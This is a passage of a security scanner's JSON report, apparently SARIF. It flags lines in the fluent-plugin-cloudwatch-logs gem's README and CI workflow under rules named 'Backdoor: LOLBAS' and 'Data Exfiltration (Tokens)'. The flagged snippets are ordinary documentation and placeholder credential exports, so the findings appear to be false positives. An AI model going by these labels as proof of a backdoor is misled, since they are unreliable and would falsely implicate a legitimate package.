                      "text": "ength of the message\n* `message_keys`: keys to send messages as events\n* `put_log_events_disable_retry_limit`: if true, `put_log_events_retry_limit` will be ignored\n* `put_log_events_retry_limit`: maximum count of retry (if exceeding this, the events will be discarded)\n* `put_log_events_retry_wait`: time before retrying PutLogEvents (retry interval increases exponentially like `put_log_events_retry_wait * (2 ^ retry_count)`)\n* `region`: AWS Region.  See [Authentication](#authentication) for more information.\n* `remove_log_group_aws_tags_key`: remove field specified by `log_group_aws_tags_key`\n* `rem",
                      "markdown": "`ength of the message\n* `message_keys`: keys to send messages as events\n* `put_log_events_disable_retry_limit`: if true, `put_log_events_retry_limit` will be ignored\n* `put_log_events_retry_limit`: maximum count of retry (if exceeding this, the events will be discarded)\n* `put_log_events_retry_wait`: time before retrying PutLogEvents (retry interval increases exponentially like `put_log_events_retry_wait * (2 ^ retry_count)`)\n* `region`: AWS Region.  See [Authentication](#authentication) for more information.\n* `remove_log_group_aws_tags_key`: remove field specified by `log_group_aws_tags_key`\n* `rem`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 189,
                  "startColumn": 29,
                  "endLine": 189,
                  "endColumn": 35,
                  "snippet": {
                    "text": "is parameter to connect to the local API endpoint (for testing)\n* `ssl_verify_peer`: when `true` (default), SSL peer certificates are verified when establishing a connection. Setting to `false` can be useful for testing.\n* `http_proxy`: use to set an optional HTTP proxy\n* `include_time_key`: include time key as part of the log entry (defaults to UTC)\n* `json_handler`: name of the library to be used to handle JSON data. For now, supported libraries are `json` (default) and `yajl`.\n* `localtime`: use localtime timezone for `include_time_key` output (overrides UTC default)\n* `log_group_aws_tags`: set a",
                    "rendered": {
                      "text": "is parameter to connect to the local API endpoint (for testing)\n* `ssl_verify_peer`: when `true` (default), SSL peer certificates are verified when establishing a connection. Setting to `false` can be useful for testing.\n* `http_proxy`: use to set an optional HTTP proxy\n* `include_time_key`: include time key as part of the log entry (defaults to UTC)\n* `json_handler`: name of the library to be used to handle JSON data. For now, supported libraries are `json` (default) and `yajl`.\n* `localtime`: use localtime timezone for `include_time_key` output (overrides UTC default)\n* `log_group_aws_tags`: set a",
                      "markdown": "`is parameter to connect to the local API endpoint (for testing)\n* `ssl_verify_peer`: when `true` (default), SSL peer certificates are verified when establishing a connection. Setting to `false` can be useful for testing.\n* `http_proxy`: use to set an optional HTTP proxy\n* `include_time_key`: include time key as part of the log entry (defaults to UTC)\n* `json_handler`: name of the library to be used to handle JSON data. For now, supported libraries are `json` (default) and `yajl`.\n* `localtime`: use localtime timezone for `include_time_key` output (overrides UTC default)\n* `log_group_aws_tags`: set a`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 109,
                  "startColumn": 97,
                  "endLine": 109,
                  "endColumn": 105,
                  "snippet": {
                    "text": "export AWS_SECRET_ACCESS_KEY=\"YOUR_SECRET_ACCESS_KEY\"\n```\n\nNote: For this to work persistently the environment will need to be set in the startup scripts or docker variables.\n\n### AWS Configuration\n\n",
                    "rendered": {
                      "text": "export AWS_SECRET_ACCESS_KEY=\"YOUR_SECRET_ACCESS_KEY\"\n```\n\nNote: For this to work persistently the environment will need to be set in the startup scripts or docker variables.\n\n### AWS Configuration\n\n",
                      "markdown": "`export AWS_SECRET_ACCESS_KEY=\"YOUR_SECRET_ACCESS_KEY\"\n```\n\nNote: For this to work persistently the environment will need to be set in the startup scripts or docker variables.\n\n### AWS Configuration\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 51,
                  "endLine": 9,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n## Requirements\n\n|fluent-plugin-cloudwatch-logs|     fluentd      |  ruby  |\n|-----------------------------|------------------|--------|\n|     >= 0.8.0                | >= 1.8.0         | >= 2.4 |\n|     >= 0.5.0 && < 0.8.0     | >= 0.14.15       | >= 2.1 |\n",
                    "rendered": {
                      "text": "\n## Requirements\n\n|fluent-plugin-cloudwatch-logs|     fluentd      |  ruby  |\n|-----------------------------|------------------|--------|\n|     >= 0.8.0                | >= 1.8.0         | >= 2.4 |\n|     >= 0.5.0 && < 0.8.0     | >= 0.14.15       | >= 2.1 |\n",
                      "markdown": "`\n## Requirements\n\n|fluent-plugin-cloudwatch-logs|     fluentd      |  ruby  |\n|-----------------------------|------------------|--------|\n|     >= 0.8.0                | >= 1.8.0         | >= 2.4 |\n|     >= 0.5.0 && < 0.8.0     | >= 0.14.15       | >= 2.1 |\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 318,
                  "startColumn": 49,
                  "endLine": 318,
                  "endColumn": 59,
                  "snippet": {
                    "text": "Or, If you do not want to use IAM roll or ENV(this is just like writing to configuration file) :\n\n```sh\nrake aws_key_id=YOUR_ACCESS_KEY aws_sec_key=YOUR_SECRET_KEY region=us-east-1 test\n```\n\nIf you want to run the test suite against a mock server, set `endpoint` as below:\n",
                    "rendered": {
                      "text": "Or, If you do not want to use IAM roll or ENV(this is just like writing to configuration file) :\n\n```sh\nrake aws_key_id=YOUR_ACCESS_KEY aws_sec_key=YOUR_SECRET_KEY region=us-east-1 test\n```\n\nIf you want to run the test suite against a mock server, set `endpoint` as below:\n",
                      "markdown": "`Or, If you do not want to use IAM roll or ENV(this is just like writing to configuration file) :\n\n```sh\nrake aws_key_id=YOUR_ACCESS_KEY aws_sec_key=YOUR_SECRET_KEY region=us-east-1 test\n```\n\nIf you want to run the test suite against a mock server, set `endpoint` as below:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/README.md"
                },
                "region": {
                  "startLine": 306,
                  "startColumn": 37,
                  "endLine": 306,
                  "endColumn": 47,
                  "snippet": {
                    "text": "```aconf\n$ export AWS_REGION=us-east-1\n$ export AWS_ACCESS_KEY_ID=\"YOUR_ACCESS_KEY\"\n$ export AWS_SECRET_ACCESS_KEY=\"YOUR_SECRET_KEY\"\n```\n\nRun tests:\n",
                    "rendered": {
                      "text": "```aconf\n$ export AWS_REGION=us-east-1\n$ export AWS_ACCESS_KEY_ID=\"YOUR_ACCESS_KEY\"\n$ export AWS_SECRET_ACCESS_KEY=\"YOUR_SECRET_KEY\"\n```\n\nRun tests:\n",
                      "markdown": "````aconf\n$ export AWS_REGION=us-east-1\n$ export AWS_ACCESS_KEY_ID=\"YOUR_ACCESS_KEY\"\n$ export AWS_SECRET_ACCESS_KEY=\"YOUR_SECRET_KEY\"\n```\n\nRun tests:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/.github/workflows/windows.yml"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 9,
                  "endLine": 14,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        ruby: [ '2.5', '2.6', '2.7', '3.0' ]\n        os:\n          - windows-latest\n    name: Ruby ${{ matrix.ruby }} unit testing on ${{ matrix.os }}\n    steps:\n    - uses: actions/checkout@v2\n    - uses: ruby/setup-ruby@v1\n",
                    "rendered": {
                      "text": "        ruby: [ '2.5', '2.6', '2.7', '3.0' ]\n        os:\n          - windows-latest\n    name: Ruby ${{ matrix.ruby }} unit testing on ${{ matrix.os }}\n    steps:\n    - uses: actions/checkout@v2\n    - uses: ruby/setup-ruby@v1\n",
                      "markdown": "`        ruby: [ '2.5', '2.6', '2.7', '3.0' ]\n        os:\n          - windows-latest\n    name: Ruby ${{ matrix.ruby }} unit testing on ${{ matrix.os }}\n    steps:\n    - uses: actions/checkout@v2\n    - uses: ruby/setup-ruby@v1\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}